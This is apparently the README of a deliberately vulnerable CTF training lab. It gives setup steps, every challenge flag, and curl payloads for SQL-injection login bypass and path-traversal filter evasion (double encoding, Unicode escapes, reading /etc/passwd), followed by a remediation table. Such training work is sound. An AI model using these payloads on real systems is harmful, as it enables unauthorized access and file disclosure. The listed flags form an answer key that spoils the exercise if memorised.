# 🛡️ Sentinel — Web Security CTF Lab

A deliberately vulnerable training lab for a security-awareness exercise. It covers two attack vectors — **SQL Injection** and **Path Traversal / Local File Inclusion** — delivered as a graded set of challenges from a trivial onboarding flag up to encoding-bypass traversal.

> ⚠️ **Authorized training use only.** Everything here is intentionally insecure. Run it on an isolated host — never alongside anything real.

---

## 🧭 The labs

| # | Lab | Vector | Endpoint | Flag |
|---|-----|--------|----------|------|
| — | **Hello World** | Onboarding (no exploit) | `/hello` | `CTF{hello_world}` |
| — | **No Password, No Problem** (demo) | SQL Injection | `/demo` | `CTF{demo_f79b17cc0c818a9f}` |
| 0 | **No Comment, Still No Problem** | SQL Injection (patched) | `/` (POST) | `CTF{8ee4d84cbeef15123c24791da26006d9}` |
| 1 | **Basic Path Traversal** | Path Traversal | `/dr-strange?filename=` | `CTF{75c4bcd59149b3004345e414c325f3b6}` |
| 2 | **The Dot-Segment Dance** | Path Traversal | `/captain-america?filename=` | `CTF{234b5a3edf97aa319646be27d8a89db0}` |
| 3 | **Blacklist + Double Decode** | Path Traversal | `/deadpool?filename=` | `CTF{2c7c8d5ec9db726a120b290922222e47}` |
| 4 | **Unicode Unlocked** | Path Traversal | `/goku?filename=` | `CTF{fb4f3b1240b02c9c9efd10a01777d13f}` |

> Flags live in `flags/*.txt` (and `login-app/hello.php` for Hello World). Re-randomize anytime:
> ```bash
> for i in 1 2 3 4; do printf 'CTF{%s}\n' "$(openssl rand -hex 16)" > flags/flag$i.txt; done
> printf 'CTF{%s}\n' "$(openssl rand -hex 16)"        > flags/flag_login.txt
> printf 'CTF{demo_%s}\n' "$(openssl rand -hex 8)"    > flags/flag_demo.txt
> ```

---

## 🧩 Setup

**Prerequisites:** Docker + Docker Compose.

```bash
git clone https://github.com/imusabkhan/Training.git
cd Training
docker compose -f docker-compose-ec2.yml up -d     # pulls prebuilt images — no build needed
```

Then browse to **http://localhost/** (replace `localhost` with the server IP in the exercise).

> Use **`docker-compose-ec2.yml`** (prebuilt images). The plain `docker-compose.yml` expects local build sources that aren't in this repo.

---

## 🚩 Payloads

Replace `<host>` with `localhost` (local) or the server IP. Path-traversal flags sit one directory above the app's `uploads/` folder, so `../flagN.txt`.

### Hello World — `/hello`
No exploitation. The flag `CTF{hello_world}` is shown on the page — copy it and submit it. Teaches the submit flow.

---

### No Password, No Problem — `/demo`  *(SQL Injection, classic)*
A textbook login: `SELECT * FROM users WHERE username='<you>' AND password='<you>'`. Comment out the password check.

```bash
# username field (the  --  comments out the rest):
curl -s -X POST "http://<host>/demo" \
  --data-urlencode "username=admin'-- -" \
  --data-urlencode "password=anything"
```
| Payload (username) | Result |
|---|---|
| `admin'-- -` | ✅ logs in as admin |

> Tip: `admin'-- -` (dash-space-dash) is engine-agnostic — the space satisfies MySQL's comment rule, the trailing `-` survives whitespace trimming.

---

### Challenge 0 — No Comment, Still No Problem — `POST /`  *(SQL Injection, patched)*
Same bug, but comment sequences (`--`, `#`, `/* */`) are **stripped** — so the demo's trick dies. The input is still concatenated, so boolean-logic injection works. **Twist:** a bare tautology fails (precedence keeps the `AND password` check); you must target **admin**.

```bash
# username field — target admin so the OR wins regardless of password:
curl -s -X POST "http://<host>/" \
  --data-urlencode "username=admin' OR '1'='1" \
  --data-urlencode "password=anything"
```
| Payload (username) | Result |
|---|---|
| `admin'-- ` | ❌ comment stripped |
| `' OR '1'='1` | ❌ precedence — `AND password` still applies |
| `admin' OR '1'='1` | ✅ logs in as admin |
| `' OR '1'='1` *(in password, username `admin`)* | ✅ alternative injection point |

---

### Level 1 — Basic Path Traversal — `/dr-strange`
No filtering. `../` escapes `uploads/`.
```bash
curl "http://<host>/dr-strange?filename=../flag1.txt"
curl "http://<host>/dr-strange?filename=../../../../../../etc/passwd"
```

### Level 2 — The Dot-Segment Dance — `/captain-america`
Filter does `replace("../","")` **once** — `....//` collapses back to `../`.
```bash
curl "http://<host>/captain-america?filename=....//flag2.txt"
curl "http://<host>/captain-america?filename=....//....//....//....//....//....//etc/passwd"
```

### Level 3 — Blacklist + Double Decode — `/deadpool`
Blacklist checks the input, then it's URL-decoded **again** (Spring already decoded once). Double-encode so the check sees harmless text.
```bash
# ../  ->  %252e%252e%252f
curl "http://<host>/deadpool?filename=%252e%252e%252fflag3.txt"

# /etc/passwd  (encode 'passwd' too — it's blacklisted):
curl "http://<host>/deadpool?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252f%2570%2561%2573%2573%2577%2564"
```

### Level 4 — Unicode Unlocked — `/goku`
Input is Unicode-unescaped before the read. `.` = `.`, `/` = `/`. Send the backslash URL-encoded as `%5c`.
```bash
curl "http://<host>/goku?filename=%5cu002e%5cu002e%5cu002fflag4.txt"
# in a browser you can paste  ../flag4.txt  directly
```

---

## 🛠️ Remediation (for the debrief)

| Anti-pattern in the labs | Fix |
|---|---|
| Concatenating input into SQL (`'$user'`) | Parameterized queries / prepared statements |
| Blacklisting characters/keywords (comment strip, `../` removal) | Not a fix — use allowlists and parameterization |
| Concatenating input into a file path (`UPLOAD_DIR + filename`) | Canonicalize (`toRealPath()` / `normalize()`) then assert it stays under the base dir |
| Validating **before** decoding | Decode fully first, then validate the final value |

Full per-lab breakdown (vulnerable code, exact lines, fixed code) lives in [`LAB_SETUP.md`](LAB_SETUP.md) and [`challenge-cards/`](challenge-cards/).
